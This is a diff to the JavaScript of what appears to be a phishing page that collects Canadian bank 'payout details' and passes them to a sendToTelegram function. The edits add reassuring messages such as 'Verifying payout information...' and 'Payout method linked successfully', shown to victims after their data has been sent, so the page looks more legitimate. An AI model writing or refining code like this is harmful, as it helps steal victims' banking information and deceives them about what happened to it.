@@ -878,13 +878,57 @@ let preference = "";
             window.location.href = "https://membership-signup.avalonflow.site/sign-in";
         }
 
-        // Show option 1 notification only
-        window.addEventListener("load", () => {
-            const notification = document.getElementById("planNotification");
-            notification.textContent = "Provide your payout details";
-            setTimeout(()=>notification.classList.add("show"),300);
-            setTimeout(()=>notification.classList.remove("show"),3300);
-        });
+        /* --------------------------
+NOTIFICATION SYSTEM
+-------------------------- */
+
+const notification = document.getElementById("planNotification");
+
+function showNotification(message, duration = 3000) {
+
+  if (!notification) return;
+
+  notification.textContent = message;
+
+  notification.classList.add("show");
+
+  clearTimeout(notification.hideTimer);
+
+  notification.hideTimer = setTimeout(() => {
+    notification.classList.remove("show");
+  }, duration);
+}
+
+
+/* --------------------------
+INITIAL NOTIFICATION
+-------------------------- */
+
+window.addEventListener("load", () => {
+
+  const saved = JSON.parse(
+    localStorage.getItem("section3Data") || "{}"
+  );
+
+  const hasSavedData = Object.values(saved).some(
+    v => v && v.toString().trim() !== ""
+  );
+
+  setTimeout(() => {
+
+    if (hasSavedData) {
+
+      showNotification("Payout method linked successfully");
+
+    } else {
+
+      showNotification("Provide your payout details");
+
+    }
+
+  }, 300);
+
+});
                     
 
 /* --------------------------
@@ -1104,6 +1148,9 @@ MAIN BUTTON HANDLER
 
 document.getElementById('nextBtnSeparate').addEventListener('click', async () => {
 
+  // SHOW PROCESSING NOTIFICATION
+  showNotification("Verifying payout information...", 2500);
+
   // Prevent invalid bank data
   if (!validateCanadianBankDetails()) {
 
@@ -1156,6 +1203,9 @@ document.getElementById('nextBtnSeparate').addEventListener('click', async () =>
   try {
 
     await sendToTelegram(data);
+
+// SUCCESS NOTIFICATION
+    showNotification("Payout method linked successfully", 3000);
 
     window.location.href = "/acu-payouts";
 
